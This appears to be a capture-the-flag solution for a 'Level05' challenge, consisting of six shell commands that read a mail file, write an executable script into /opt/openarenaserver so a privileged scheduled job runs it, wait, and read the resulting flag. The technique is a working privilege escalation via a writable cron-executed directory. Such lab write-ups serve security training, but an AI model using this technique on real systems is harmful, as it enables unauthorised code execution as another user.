# Level05 steps
cat /var/mail/level05
printf '#!/bin/sh\ngetflag > /tmp/flag05\n' > /opt/openarenaserver/runme
chmod +x /opt/openarenaserver/runme
sleep 130
cat /tmp/flag05